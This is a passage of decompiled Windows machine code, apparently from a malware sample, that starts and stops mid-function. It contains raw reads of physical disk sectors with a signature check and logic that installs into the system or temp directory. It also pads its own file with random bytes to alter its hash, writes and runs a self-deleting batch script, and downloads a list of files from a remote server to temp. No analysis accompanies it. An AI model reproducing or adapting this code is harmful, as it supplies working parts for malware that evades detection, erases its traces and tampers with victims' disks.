  short local_38e [80];
  undefined2 local_2ee;
  wchar_t local_214;
  undefined local_212 [518];
  uint local_c;
  undefined4 local_8;
  
  local_c = DAT_00416048 ^ (uint)&stack0xfffffffc;
  local_214 = L'\0';
  _memset(local_212,0,0x206);
  local_8 = 0;
  _memset(&local_414,0,0x200);
  iVar2 = FUN_00402760(&local_414);
  if (iVar2 != 0) {
    local_418 = &DAT_00414554;
    local_41c = &DAT_00418578;
    do {
      sVar1 = *local_418;
      *local_41c = sVar1;
      local_418 = local_418 + 1;
      local_41c = local_41c + 1;
    } while (sVar1 != 0);
    local_428 = local_38e;
    local_42c = &DAT_00418470;
    do {
      sVar1 = *local_428;
      *local_42c = sVar1;
      local_428 = local_428 + 1;
      local_42c = local_42c + 1;
    } while (sVar1 != 0);
    local_438 = local_410;
    local_43c = &DAT_004184f0;
    do {
      sVar1 = *local_438;
      *local_43c = sVar1;
      local_438 = local_438 + 1;
      local_43c = local_43c + 1;
    } while (sVar1 != 0);
    DAT_00418570 = local_390;
    DAT_004185f8 = local_2ee;
    DAT_004185fc = 5;
    if (DAT_00416f10 == 3) {
      FUN_00403f80(0);
    }
    else {
      FUN_00403f80(1);
    }
    _wcscat_s(&local_214,0x104,u_golfset_ini_00414570);
    DeleteFileW(&local_214);
    local_8 = 1;
  }
  ___security_check_cookie_4(local_c ^ (uint)&stack0xfffffffc);
  return;
}



void FUN_00403850(void)

{
  BOOL BVar1;
  undefined4 *unaff_ESI;
  _OSVERSIONINFOW local_124;
  uint local_8;
  
  local_8 = DAT_00416048 ^ (uint)&stack0xfffffffc;
  *unaff_ESI = 0;
  _memset(&local_124,0,0x11c);
  local_124.dwOSVersionInfoSize = 0x11c;
  BVar1 = GetVersionExW(&local_124);
  if (BVar1 != 0) {
    if (local_124.dwMajorVersion == 5) {
      if ((1 < local_124.dwMinorVersion) || (local_124.dwMinorVersion == 1)) {
        *unaff_ESI = 3;
        ___security_check_cookie_4(local_8 ^ (uint)&stack0xfffffffc);
        return;
      }
    }
    else if (local_124.dwMajorVersion == 6) {
      if (local_124.dwMinorVersion == 0) {
        *unaff_ESI = 4;
        ___security_check_cookie_4(local_8 ^ (uint)&stack0xfffffffc);
        return;
      }
      if (local_124.dwMinorVersion == 1) {
        *unaff_ESI = 5;
      }
    }
  }
  ___security_check_cookie_4(local_8 ^ (uint)&stack0xfffffffc);
  return;
}



void FUN_00403910(void)

{
  LPWSTR unaff_EDI;
  WCHAR local_210;
  undefined local_20e [518];
  uint local_8;
  
  local_8 = DAT_00416048 ^ (uint)&stack0xfffffffc;
  local_210 = L'\0';
  _memset(local_20e,0,0x206);
  if (DAT_00416f10 == 3) {
    GetSystemDirectoryW(&local_210,0x104);
    _wcscat_s(&local_210,0x104,(wchar_t *)&DAT_00414280);
  }
  else {
    GetTempPathW(0x104,&local_210);
  }
  wsprintfW(unaff_EDI,u__s_s_exe_00414284,&local_210);
  ___security_check_cookie_4(local_8 ^ (uint)&stack0xfffffffc);
  return;
}



void FUN_004039b0(void)

{
  wchar_t *unaff_ESI;
  WCHAR local_238;
  undefined local_236 [518];
  wchar_t local_30;
  undefined4 local_2e;
  undefined4 local_2a;
  undefined4 local_26;
  undefined4 local_22;
  undefined4 local_1e;
  undefined4 local_1a;
  undefined4 local_16;
  undefined4 local_12;
  undefined4 local_e;
  undefined2 local_a;
  uint local_8;
  
  local_8 = DAT_00416048 ^ (uint)&stack0xfffffffc;
  local_238 = L'\0';
  _memset(local_236,0,0x206);
  local_2e = 0;
  local_2a = 0;
  local_26 = 0;
  local_22 = 0;
  local_1e = 0;
  local_1a = 0;
  local_16 = 0;
  local_12 = 0;
  local_e = 0;
  local_a = 0;
  local_30 = L'\0';
  _wcscpy_s(&local_30,0x14,unaff_ESI);
  _wcscat_s(&local_30,0x14,u__exe_00414298);
  GetModuleFileNameW((HMODULE)0x0,&local_238,0x104);
  _wcsstr(&local_238,&local_30);
  ___security_check_cookie_4(local_8 ^ (uint)&stack0xfffffffc);
  return;
}



undefined4 __cdecl FUN_00403a70(undefined4 *param_1)

{
  short sVar1;
  HANDLE in_EAX;
  undefined4 *_Dst;
  uint uVar2;
  BOOL BVar3;
  short *psVar4;
  int iVar5;
  undefined4 *puVar6;
  DWORD local_20;
  _OVERLAPPED local_1c;
  
  if (in_EAX != (HANDLE)0xffffffff) {
    _Dst = (undefined4 *)_malloc(0x400);
    _memset(_Dst,0,0x400);
    uVar2 = FUN_00403c60();
    local_1c.InternalHigh = 0;
    local_1c.hEvent = (HANDLE)0x0;
    local_1c.u.s.OffsetHigh = uVar2 >> 0x17;
    local_1c.u.s.Offset = uVar2 << 9;
    local_1c.Internal = 0;
    local_20 = 0;
    BVar3 = ReadFile(in_EAX,_Dst,0x400,&local_20,&local_1c);
    if (BVar3 != 0) {
      if (_Dst[1] == 0x5042475f) {
        psVar4 = (short *)((int)_Dst + 0x10e);
        do {
          sVar1 = *psVar4;
          psVar4 = psVar4 + 1;
        } while (sVar1 != 0);
        if ((int)psVar4 - (int)(_Dst + 0x44) >> 1 != 0) goto LAB_00403b17;
      }
      local_1c.InternalHigh = 0;
      local_1c.hEvent = (HANDLE)0x0;
      local_1c.Internal = 0;
      local_20 = 0;
      local_1c.u.s.Offset = 0x3c00;
      local_1c.u.s.OffsetHigh = 0;
      BVar3 = ReadFile(in_EAX,_Dst,0x400,&local_20,&local_1c);
      if ((BVar3 != 0) && (_Dst[1] == 0x5042475f)) {
        psVar4 = (short *)((int)_Dst + 0x10e);
        do {
          sVar1 = *psVar4;
          psVar4 = psVar4 + 1;
        } while (sVar1 != 0);
        if ((int)psVar4 - (int)(_Dst + 0x44) >> 1 != 0) {
LAB_00403b17:
          puVar6 = _Dst;
          for (iVar5 = 0x8d; iVar5 != 0; iVar5 = iVar5 + -1) {
            *param_1 = *puVar6;
            puVar6 = puVar6 + 1;
            param_1 = param_1 + 1;
          }
          *(undefined2 *)param_1 = *(undefined2 *)puVar6;
          _free(_Dst);
          return 1;
        }
      }
    }
    _free(_Dst);
  }
  return 0;
}



void FUN_00403bc0(void)

{
  int iVar1;
  undefined4 *unaff_ESI;
  WCHAR local_210;
  undefined local_20e [518];
  uint local_8;
  
  local_8 = DAT_00416048 ^ (uint)&stack0xfffffffc;
  local_210 = L'\0';
  _memset(local_20e,0,0x206);
  GetSystemDirectoryW(&local_210,0x104);
  FUN_00403d50(local_210 + L'���');
  iVar1 = FUN_00403e50();
  if (iVar1 == -1) {
    ___security_check_cookie_4(local_8 ^ (uint)&stack0xfffffffc);
    return;
  }
  FUN_00403a70(unaff_ESI);
  ___security_check_cookie_4(local_8 ^ (uint)&stack0xfffffffc);
  return;
}



void FUN_00403c60(void)

{
  HANDLE unaff_EDI;
  _OVERLAPPED local_224;
  DWORD local_210;
  undefined local_20c;
  undefined local_20b [515];
  uint local_8;
  
  local_8 = DAT_00416048 ^ (uint)&stack0xfffffffc;
  Sleep(100);
  local_20c = 0;
  _memset(local_20b,0,0x1ff);
  if (unaff_EDI != (HANDLE)0xffffffff) {
    local_224.InternalHigh = 0;
    local_224.hEvent = (HANDLE)0x0;
    local_224.Internal = 0;
    local_210 = 0;
    local_224.u.s.Offset = 0;
    local_224.u.s.OffsetHigh = 0;
    ReadFile(unaff_EDI,&local_20c,0x200,&local_210,&local_224);
  }
  Sleep(100);
  ___security_check_cookie_4(local_8 ^ (uint)&stack0xfffffffc);
  return;
}



void __cdecl FUN_00403d50(short param_1)

{
  HANDLE hDevice;
  BOOL BVar1;
  undefined4 *unaff_EBX;
  DWORD local_43c;
  undefined local_438 [8];
  undefined4 local_430;
  uint local_428;
  uint local_424;
  wchar_t local_38;
  undefined4 local_36;
  undefined4 local_32;
  undefined4 local_2e;
  undefined4 local_2a;
  undefined4 local_26;
  undefined4 local_22;
  undefined4 local_1e;
  undefined4 local_1a;
  undefined4 local_16;
  undefined2 local_12;
  undefined4 local_10;
  undefined2 local_c;
  uint local_8;
  
  local_8 = DAT_00416048 ^ (uint)&stack0xfffffffc;
  local_c = DAT_004142b8;
  local_36 = 0;
  local_32 = 0;
  local_2e = 0;
  local_2a = 0;
  local_26 = 0;
  local_22 = 0;
  local_1e = 0;
  local_1a = 0;
  local_16 = 0;
  local_12 = 0;
  local_38 = L'\0';
  local_10 = CONCAT22((short)((uint)DAT_004142b4 >> 0x10),param_1 + 0x41);
  FUN_00405770(&local_10,&local_38,u______s_004142bc);
  hDevice = CreateFileW(&local_38,0x80000000,3,(LPSECURITY_ATTRIBUTES)0x0,3,0,(HANDLE)0x0);
  if (hDevice != (HANDLE)0xffffffff) {
    BVar1 = DeviceIoControl(hDevice,0x560000,(LPVOID)0x0,0,local_438,0x400,&local_43c,
                            (LPOVERLAPPED)0x0);
    if (BVar1 != 0) {
      __alldiv(local_428,local_424,0x200,0);
      *unaff_EBX = local_430;
    }
  }
  if (hDevice != (HANDLE)0x0) {
    CloseHandle(hDevice);
  }
  ___security_check_cookie_4(local_8 ^ (uint)&stack0xfffffffc);
  return;
}



void FUN_00403e50(void)

{
  int iVar1;
  int unaff_EBX;
  undefined4 *puVar2;
  undefined4 *puVar3;
  undefined4 local_44 [9];
  undefined4 local_20;
  wchar_t local_1c;
  undefined4 local_1a;
  undefined4 local_16;
  undefined4 local_12;
  undefined4 local_e;
  undefined2 local_a;
  uint local_8;
  
  local_8 = DAT_00416048 ^ (uint)&stack0xfffffffc;
  puVar2 = (undefined4 *)u_____PHYSICALDRIVE_004142cc;
  puVar3 = local_44;
  for (iVar1 = 9; iVar1 != 0; iVar1 = iVar1 + -1) {
    *puVar3 = *puVar2;
    puVar2 = puVar2 + 1;
    puVar3 = puVar3 + 1;
  }
  local_20 = 0;
  local_1c = L'\0';
  local_1a = 0;
  local_16 = 0;
  local_12 = 0;
  local_e = 0;
  local_a = 0;
  if (-1 < unaff_EBX) {
    __itow_s(unaff_EBX,&local_1c,10,10);
    _wcscat_s((wchar_t *)local_44,0x14,&local_1c);
    if (unaff_EBX != 0) {
      CreateFileW((LPCWSTR)local_44,0xc0000000,3,(LPSECURITY_ATTRIBUTES)0x0,3,0,(HANDLE)0x0);
      ___security_check_cookie_4(local_8 ^ (uint)&stack0xfffffffc);
      return;
    }
    CreateFileW((LPCWSTR)local_44,0x80000000,3,(LPSECURITY_ATTRIBUTES)0x0,3,0,(HANDLE)0x0);
  }
  ___security_check_cookie_4(local_8 ^ (uint)&stack0xfffffffc);
  return;
}



void __fastcall FUN_00403f00(uint param_1)

{
  wchar_t *unaff_ESI;
  wchar_t local_28;
  undefined4 local_26;
  undefined4 local_22;
  undefined4 local_1e;
  undefined4 local_1a;
  undefined4 local_16;
  undefined4 local_12;
  undefined4 local_e;
  undefined2 local_a;
  uint local_8;
  
  local_8 = DAT_00416048 ^ (uint)&stack0xfffffffc;
  local_28 = L'\0';
  local_26 = 0;
  local_22 = 0;
  local_1e = 0;
  local_1a = 0;
  local_16 = 0;
  local_12 = 0;
  local_e = 0;
  local_a = 0;
  FUN_00405790(param_1 >> 0x18,&local_28,u__d__d__d__d_004142f0);
  _wcscpy_s(unaff_ESI,0x10,&local_28);
  ___security_check_cookie_4(local_8 ^ (uint)&stack0xfffffffc);
  return;
}



void __cdecl FUN_00403f80(int param_1)

{
  LPWSTR unaff_ESI;
  
  if (param_1 != 0) {
    GetTempPathW(0x104,unaff_ESI);
    return;
  }
  GetSystemDirectoryW(unaff_ESI,0x104);
  _wcscat_s(unaff_ESI,0x104,(wchar_t *)&DAT_00414308);
  return;
}



undefined4 __thiscall FUN_00403fc0(void *this,wchar_t *param_1)

{
  wchar_t *in_EAX;
  errno_t eVar1;
  size_t _ElementSize;
  void *_DstBuf;
  DWORD DVar2;
  uint uVar3;
  int iVar4;
  int iVar5;
  FILE *local_8;
  
  local_8 = (FILE *)0x0;
  eVar1 = __wfopen_s(&local_8,in_EAX,(wchar_t *)&DAT_0041430c);
  if (eVar1 != 0) {
    return 0;
  }
  _fseek(local_8,0,2);
  _ElementSize = _ftell(local_8);
  _fseek(local_8,0,0);
  _DstBuf = _malloc(_ElementSize + (int)this);
  _fread(_DstBuf,_ElementSize,1,local_8);
  _fclose(local_8);
  _memset((void *)(_ElementSize + (int)_DstBuf),0,(size_t)this);
  iVar4 = (int)(((int)this >> 0x1f & 3U) + (int)this) >> 2;
  DVar2 = GetTickCount();
  FUN_004066da(DVar2);
  iVar5 = 0;
  if (0 < iVar4) {
    do {
      uVar3 = FUN_004066ec();
      *(uint *)((int)(void *)(_ElementSize + (int)_DstBuf) + iVar5 * 4) = uVar3;
      iVar5 = iVar5 + 1;
    } while (iVar5 < iVar4);
  }
  eVar1 = __wfopen_s(&local_8,param_1,(wchar_t *)&DAT_00414314);
  if (eVar1 == 0) {
    _fwrite(_DstBuf,_ElementSize + (int)this,1,local_8);
    _fclose(local_8);
    if (_DstBuf != (void *)0x0) {
      _free(_DstBuf);
    }
    return 1;
  }
  return 0;
}



void FUN_004040e0(void)

{
  char cVar1;
  undefined4 *puVar2;
  uint uVar3;
  char *pcVar4;
  FILE *_File;
  uint uVar5;
  undefined4 *puVar6;
  undefined4 local_328 [2];
  undefined2 local_320;
  undefined local_31e;
  undefined4 local_31d;
  undefined4 local_319;
  undefined local_315;
  char local_314 [259];
  undefined4 uStack_211;
  CHAR local_10c [260];
  uint local_8;
  
  local_8 = DAT_00416048 ^ (uint)&stack0xfffffffc;
  uStack_211._1_1_ = 0;
  _memset((void *)((int)&uStack_211 + 2),0,0x103);
  local_10c[0] = '\0';
  _memset(local_10c + 1,0,0x103);
  local_314[0] = '\0';
  _memset(local_314 + 1,0,0x103);
  local_328[0] = DAT_0041431c;
  local_328[1] = DAT_00414320;
  local_31e = DAT_00414326;
  local_320 = DAT_00414324;
  local_31d = 0;
  local_319 = 0;
  local_315 = 0;
  GetTempPathA(0x104,(LPSTR)((int)&uStack_211 + 1));
  puVar2 = local_328;
  do {
    cVar1 = *(char *)puVar2;
    puVar2 = (undefined4 *)((int)puVar2 + 1);
  } while (cVar1 != '\0');
  uVar3 = (int)puVar2 - (int)local_328;
  puVar2 = &uStack_211;
  do {
    pcVar4 = (char *)((int)puVar2 + 1);
    puVar2 = (undefined4 *)((int)puVar2 + 1);
  } while (*pcVar4 != '\0');
  puVar6 = local_328;
  for (uVar5 = uVar3 >> 2; uVar5 != 0; uVar5 = uVar5 - 1) {
    *puVar2 = *puVar6;
    puVar6 = puVar6 + 1;
    puVar2 = puVar2 + 1;
  }
  for (uVar3 = uVar3 & 3; uVar3 != 0; uVar3 = uVar3 - 1) {
    *(undefined *)puVar2 = *(undefined *)puVar6;
    puVar6 = (undefined4 *)((int)puVar6 + 1);
    puVar2 = (undefined4 *)((int)puVar2 + 1);
  }
  GetModuleFileNameA((HMODULE)0x0,local_10c,0x104);
  _strcpy_s(local_314,0x104,local_10c);
  pcVar4 = _strrchr(local_314,0x5c);
  if (pcVar4 != (char *)0x0) {
    *pcVar4 = '\0';
  }
  _File = _fopen((char *)((int)&uStack_211 + 1),&DAT_00414328);
  if (_File != (FILE *)0x0) {
    _fwrite(s__Repeat_0041432c,9,1,_File);
    _fwrite(s_del___00414338,5,1,_File);
    pcVar4 = local_10c;
    do {
      cVar1 = *pcVar4;
      pcVar4 = pcVar4 + 1;
    } while (cVar1 != '\0');
    _fwrite(local_10c,(int)pcVar4 - (int)(local_10c + 1),1,_File);
    _fwrite(&DAT_00414340,2,1,_File);
    _fwrite(s_if_exist___00414344,10,1,_File);
    pcVar4 = local_10c;
    do {
      cVar1 = *pcVar4;
      pcVar4 = pcVar4 + 1;
    } while (cVar1 != '\0');
    _fwrite(local_10c,(int)pcVar4 - (int)(local_10c + 1),1,_File);
    _fwrite(s___goto_Repeat_00414350,0xf,1,_File);
    _fwrite(s_rmdir___00414360,7,1,_File);
    pcVar4 = local_314;
    do {
      cVar1 = *pcVar4;
      pcVar4 = pcVar4 + 1;
    } while (cVar1 != '\0');
    _fwrite(local_314,(int)pcVar4 - (int)(local_314 + 1),1,_File);
    _fwrite(&DAT_00414368,3,1,_File);
    _fwrite(s_del___0041436c,5,1,_File);
    pcVar4 = (char *)((int)&uStack_211 + 1);
    do {
      cVar1 = *pcVar4;
      pcVar4 = pcVar4 + 1;
    } while (cVar1 != '\0');
    _fwrite((void *)((int)&uStack_211 + 1),(int)pcVar4 - ((int)&uStack_211 + 2),1,_File);
    _fwrite(&DAT_00414374,1,1,_File);
    _fclose(_File);
    ShellExecuteA((HWND)0x0,&DAT_00414378,(LPCSTR)((int)&uStack_211 + 1),(LPCSTR)0x0,(LPCSTR)0x0,0);
  }
  ___security_check_cookie_4(local_8 ^ (uint)&stack0xfffffffc);
  return;
}



void FUN_00404390(void)

{
  wchar_t wVar1;
  wchar_t *pwVar2;
  wchar_t *pwVar3;
  int iVar4;
  int unaff_EDI;
  WCHAR local_210;
  undefined local_20e [518];
  uint local_8;
  
  local_8 = DAT_00416048 ^ (uint)&stack0xfffffffc;
  local_210 = L'\0';
  _memset(local_20e,0,0x206);
  GetModuleFileNameW((HMODULE)0x0,&local_210,0x104);
  pwVar2 = _wcsrchr(&local_210,L'\\');
  *pwVar2 = L'\0';
  pwVar2 = pwVar2 + 1;
  pwVar3 = _wcsrchr(pwVar2,L'.');
  *pwVar3 = L'\0';
  iVar4 = unaff_EDI - (int)pwVar2;
  do {
    wVar1 = *pwVar2;
    *(wchar_t *)(iVar4 + (int)pwVar2) = wVar1;
    pwVar2 = pwVar2 + 1;
  } while (wVar1 != L'\0');
  ___security_check_cookie_4(local_8 ^ (uint)&stack0xfffffffc);
  return;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

void FUN_00404430(void)

{
  short *psVar1;
  int iVar2;
  
  _DAT_00418650 = DAT_00418a48;
  DAT_00418748 = FUN_004044e0(&DAT_00418926);
  DAT_0041874c = DAT_004189a6;
  DAT_0041874e = FUN_004044e0(&DAT_00418884);
  DAT_00418752 = (uint)DAT_00418904;
  iVar2 = 0;
  do {
    psVar1 = (short *)((int)&DAT_00418906 + iVar2);
    *(short *)((int)&DAT_00418756 + iVar2) = *psVar1;
    iVar2 = iVar2 + 2;
  } while (*psVar1 != 0);
  iVar2 = 0;
  do {
    psVar1 = (short *)((int)&DAT_00418a28 + iVar2);
    *(short *)((int)&DAT_00418776 + iVar2) = *psVar1;
    iVar2 = iVar2 + 2;
  } while (*psVar1 != 0);
  iVar2 = 0;
  do {
    psVar1 = (short *)((int)&DAT_00418a08 + iVar2);
    *(short *)((int)&DAT_00418796 + iVar2) = *psVar1;
    iVar2 = iVar2 + 2;
  } while (*psVar1 != 0);
  return;
}



uint FUN_004044e0(undefined4 param_1)

{
  undefined4 *puVar1;
  int iVar2;
  uint uVar3;
  longlong lVar4;
  longlong lVar5;
  longlong lVar6;
  wchar_t *local_1c [4];
  uint local_c;
  wchar_t *local_8;
  
  local_1c[0] = (wchar_t *)0x0;
  local_1c[1] = (wchar_t *)0x0;
  local_1c[2] = (wchar_t *)0x0;
  local_1c[3] = (wchar_t *)0x0;
  iVar2 = 0;
  do {
    puVar1 = (undefined4 *)operator_new(0x20);
    *puVar1 = 0;
    puVar1[1] = 0;
    puVar1[2] = 0;
    puVar1[3] = 0;
    puVar1[4] = 0;
    local_1c[iVar2] = (wchar_t *)puVar1;
    puVar1[5] = 0;
    iVar2 = iVar2 + 1;
    puVar1[6] = 0;
    puVar1[7] = 0;
  } while (iVar2 < 4);
  iVar2 = FUN_004045d0((int)local_1c);
  if (iVar2 != 4) {
    return 0;
  }
  lVar4 = __wcstoi64(local_1c[0],&local_8,10);
  lVar5 = __wcstoi64(local_1c[1],&local_8,10);
  lVar6 = __wcstoi64(local_1c[2],&local_8,10);
  local_c = (uint)lVar6;
  lVar6 = __wcstoi64(local_1c[3],&local_8,10);
  uVar3 = ((int)lVar4 << 8 | (uint)lVar5) << 8 | local_c;
  iVar2 = 0;
  do {
    if (local_1c[iVar2] != (wchar_t *)0x0) {
      FUN_00406c67(local_1c[iVar2]);
    }
    iVar2 = iVar2 + 1;
  } while (iVar2 < 4);
  return (uint)lVar6 | uVar3 << 8;
}



int __cdecl FUN_004045d0(int param_1)

{
  int iVar1;
  wchar_t wVar2;
  wchar_t *in_EAX;
  wchar_t *pwVar3;
  int iVar4;
  size_t _Count;
  
  iVar4 = 0;
  pwVar3 = in_EAX;
  do {
    wVar2 = *pwVar3;
    pwVar3 = pwVar3 + 1;
  } while (wVar2 != L'\0');
  if ((int)pwVar3 - (int)(in_EAX + 1) >> 1 == 0) {
    return 0;
  }
  pwVar3 = _wcsstr(in_EAX,(wchar_t *)&DAT_00414380);
  while (pwVar3 != (wchar_t *)0x0) {
    _Count = (int)pwVar3 - (int)in_EAX >> 1;
    if (0xf < (int)_Count) {
      _Count = 0xf;
    }
    _wcsncpy(*(wchar_t **)(param_1 + iVar4 * 4),in_EAX,_Count);
    iVar1 = iVar4 * 4;
    iVar4 = iVar4 + 1;
    in_EAX = pwVar3 + 1;
    *(undefined2 *)(*(int *)(param_1 + iVar1) + _Count * 2) = 0;
    pwVar3 = _wcsstr(in_EAX,(wchar_t *)&DAT_00414380);
  }
  _wcscpy_s(*(wchar_t **)(param_1 + iVar4 * 4),0xf,in_EAX);
  return iVar4 + 1;
}



undefined4 __cdecl FUN_00404680(undefined4 *param_1,undefined *param_2)

{
  LPVOID *ppvVar1;
  HANDLE pvVar2;
  LPVOID lpMem;
  int iVar3;
  LPVOID pvVar4;
  undefined4 uVar5;
  DWORD DVar6;
  SIZE_T dwBytes;
  SIZE_T local_c;
  uint local_8;
  
  local_8 = 0;
  local_c = 15000;
  do {
    DVar6 = 0;
    dwBytes = local_c;
    pvVar2 = GetProcessHeap();
    lpMem = HeapAlloc(pvVar2,DVar6,dwBytes);
    if (lpMem == (LPVOID)0x0) {
      return 0xffffffff;
    }
    iVar3 = GetAdaptersAddresses(2,0x10,0,lpMem,&local_c);
    if (iVar3 == 0x6f) {
      DVar6 = 0;
      pvVar2 = GetProcessHeap();
      HeapFree(pvVar2,DVar6,lpMem);
      lpMem = (LPVOID)0x0;
    }
    local_8 = local_8 + 1;
    if (iVar3 != 0x6f) {
      if (iVar3 == 0) {
        pvVar4 = lpMem;
        if (lpMem != (LPVOID)0x0) goto LAB_00404728;
        goto LAB_00404783;
      }
      break;
    }
  } while (local_8 < 3);
  uVar5 = 0xfffffffd;
  goto LAB_004046f2;
  while (ppvVar1 = (LPVOID *)((int)pvVar4 + 8), pvVar4 = *ppvVar1, *ppvVar1 != (LPVOID)0x0) {
LAB_00404728:
    if ((*(int *)((int)pvVar4 + 0x34) == 6) && (*(int *)((int)pvVar4 + 0x1c) != 0)) {
      *param_1 = *(undefined4 *)((int)pvVar4 + 0x2c);
      *(undefined2 *)(param_1 + 1) = *(undefined2 *)((int)pvVar4 + 0x30);
      param_2[3] = *(undefined *)(*(int *)(*(int *)((int)pvVar4 + 0x10) + 0xc) + 4);
      param_2[2] = *(undefined *)(*(int *)(*(int *)((int)pvVar4 + 0x10) + 0xc) + 5);
      param_2[1] = *(undefined *)(*(int *)(*(int *)((int)pvVar4 + 0x10) + 0xc) + 6);
      *param_2 = *(undefined *)(*(int *)(*(int *)((int)pvVar4 + 0x10) + 0xc) + 7);
LAB_00404783:
      uVar5 = 0;
      goto LAB_004046f2;
    }
  }
  uVar5 = 0;
LAB_004046f2:
  if (lpMem != (LPVOID)0x0) {
    DVar6 = 0;
    pvVar2 = GetProcessHeap();
    HeapFree(pvVar2,DVar6,lpMem);
  }
  return uVar5;
}



undefined4 FUN_00404790(void)

{
  void *pvVar1;
  int iVar2;
  LPCSTR *ppCVar3;
  void *unaff_ESI;
  undefined4 local_8;
  
  pvVar1 = operator_new(0x20);
  _memset(unaff_ESI,0,0xa0);
  iVar2 = FUN_00404680((undefined4 *)((int)unaff_ESI + 0x4a),
                       (undefined *)(undefined4 *)((int)unaff_ESI + 0x50));
  if (iVar2 == 0) {
    local_8 = Ordinal_8(*(undefined4 *)((int)unaff_ESI + 0x50));
    ppCVar3 = (LPCSTR *)Ordinal_51(&local_8,4,2);
    if (ppCVar3 != (LPCSTR *)0x0) {
      FUN_00404810(*ppCVar3);
      if (pvVar1 != (void *)0x0) {
        FUN_00406c67(pvVar1);
      }
      return 1;
    }
  }
  return 0;
}



LPWSTR __cdecl FUN_00404810(LPCSTR param_1)

{
  char cVar1;
  LPWSTR in_EAX;
  LPCSTR pCVar2;
  int iVar3;
  int iVar4;
  
  iVar4 = 0x20;
  pCVar2 = param_1;
  do {
    cVar1 = *pCVar2;
    pCVar2 = pCVar2 + 1;
  } while (cVar1 != '\0');
  iVar3 = (int)pCVar2 - (int)(param_1 + 1);
  if (in_EAX == (LPWSTR)0x0) {
    iVar4 = MultiByteToWideChar(0,0,param_1,-1,(LPWSTR)0x0,0);
    in_EAX = (LPWSTR)_malloc(iVar4 * 2);
  }
  if (iVar3 == 0) {
    *in_EAX = L'\0';
    return in_EAX;
  }
  if ((0 < iVar4) && (iVar4 + -1 < iVar3)) {
    iVar3 = iVar4 + -1;
  }
  MultiByteToWideChar(0,0,param_1,-1,in_EAX,iVar3 + 1);
  return in_EAX;
}



void __cdecl FUN_00404890(uint param_1)

{
  char *unaff_ESI;
  char local_18;
  undefined4 local_17;
  undefined4 local_13;
  undefined4 local_f;
  undefined2 local_b;
  undefined local_9;
  uint local_8;
  
  local_8 = DAT_00416048 ^ (uint)&stack0xfffffffc;
  local_18 = '\0';
  local_17 = 0;
  local_13 = 0;
  local_f = 0;
  local_b = 0;
  local_9 = 0;
  FUN_004057b0(param_1 >> 0x10 & 0xff,&local_18,s__d__d__d__d_00414384);
  _strcpy_s(unaff_ESI,0x10,&local_18);
  ___security_check_cookie_4(local_8 ^ (uint)&stack0xfffffffc);
  return;
}



void FUN_00404900(void)

{
  uint uVar1;
  int iVar2;
  int iVar3;
  
  uVar1 = DAT_00416048 ^ (uint)&stack0xfffffffc;
  iVar2 = FUN_004049b0();
  if ((((iVar2 != 0) && (iVar3 = FUN_004049b0(), iVar3 != 0)) && (iVar2 == 1)) && (iVar3 == 1)) {
    if (DAT_0041874e != 0) {
      FUN_00404890(DAT_0041874e);
    }
    FUN_004049b0();
  }
  ___security_check_cookie_4(uVar1 ^ (uint)&stack0xfffffffc);
  return;
}



void FUN_004049b0(void)

{
  int iVar1;
  undefined4 unaff_EBX;
  wchar_t *_Src;
  short *this;
  undefined4 unaff_EDI;
  wchar_t local_418;
  undefined local_416 [518];
  WCHAR local_210;
  undefined local_20e [518];
  uint local_8;
  
  local_8 = DAT_00416048 ^ (uint)&stack0xfffffffc;
  iVar1 = FUN_00404ae0(unaff_EDI,unaff_EBX);
  if (iVar1 == 0) {
    local_210 = L'\0';
    _memset(local_20e,0,0x206);
    local_418 = L'\0';
    _memset(local_416,0,0x206);
    GetTempPathW(0x104,&local_210);
    _Src = &DAT_00417ef0;
    do {
      if (*_Src != L'\0') {
        _wcscpy_s(&local_418,0x104,&local_210);
        _wcscat_s(&local_418,0x104,_Src);
      }
      _Src = _Src + 0x8c;
    } while ((int)_Src < 0x418468);
    this = &DAT_00417ef0;
    do {
      if (*this != 0) {
        FUN_004053f0(this,unaff_EDI,unaff_EBX,1);
      }
      this = this + 0x8c;
    } while ((int)this < 0x418468);
    _wcscat_s(&local_210,0x104,&DAT_00418c80);
    GetFileAttributesW(&local_210);
  }
  ___security_check_cookie_4(local_8 ^ (uint)&stack0xfffffffc);
  return;
}



void __cdecl FUN_00404ae0(undefined4 param_1,undefined4 param_2)

{
  wchar_t *_Src;
  void *_Dst;
  uint uVar1;
  int iVar2;
  undefined4 extraout_ECX;
  ushort uVar3;
  undefined4 *puVar4;
  size_t sVar5;
  undefined4 *puVar6;
  size_t local_c1c;
  void *local_c18;
  int local_c14;
  uint local_c10;
  undefined4 local_c0c;
  undefined4 local_c08 [256];
  undefined2 local_808;
  undefined local_806 [2046];
  uint local_8;
  
  local_8 = DAT_00416048 ^ (uint)&stack0xfffffffc;
  local_c0c = 0;
  puVar4 = &DAT_00418a80;
  puVar6 = local_c08;
  for (iVar2 = 0x80; iVar2 != 0; iVar2 = iVar2 + -1) {
    *puVar6 = *puVar4;
    puVar4 = puVar4 + 1;
    puVar6 = puVar6 + 1;
  }
  _Dst = _malloc(0x10000);
  local_c18 = _Dst;
  _memset(_Dst,0,0x10000);
  local_c1c = 0x10000;
  local_808 = 0;
  _memset(local_806,0,0x7fe);
  local_c14 = 0;
  local_c10 = 0;
  iVar2 = FUN_00404d20(param_2,&local_808);
  if (iVar2 == 0) {
    local_c0c = 1;
  }
  else {
    iVar2 = FUN_00404e40(extraout_ECX,&local_c14,0xbb9,(undefined2 *)local_c08,0x200,&local_808);
    if (iVar2 == 0) {
      local_c0c = 3;
    }
    else {
      if (_Dst == (void *)0x0) goto LAB_00404cec;
      iVar2 = FUN_00405040(_Dst,&local_c1c,&local_c14,(undefined2 *)&local_c10,&local_808);
      sVar5 = local_c1c;
      if (((iVar2 == 0) || ((short)local_c10 != 0xbb9)) || (local_c1c == 0)) {
        local_c0c = 2;
      }
      else {
        _memset(&DAT_00417ef0,0,0x578);
        uVar3 = 0;
        local_c10 = 0;
        _Dst = local_c18;
        if (0x117 < (int)sVar5) {
          uVar1 = 0;
          do {
            _Src = (wchar_t *)(uVar1 + (int)local_c18);
            if ((*(short *)(uVar1 + (int)local_c18) != 0) && (uVar3 < 5)) {
              uVar1 = (uint)uVar3;
              _wcscpy_s(&DAT_00417ef0 + uVar1 * 0x8c,0x7f,_Src);
              _memcpy_s(&DAT_00417ff4 + uVar1 * 0x118,0x14,_Src + 0x82,0x14);
              (&DAT_00417ff0)[uVar1 * 0x46] = *(undefined4 *)(_Src + 0x80);
              uVar3 = uVar3 + 1;
              sVar5 = local_c1c;
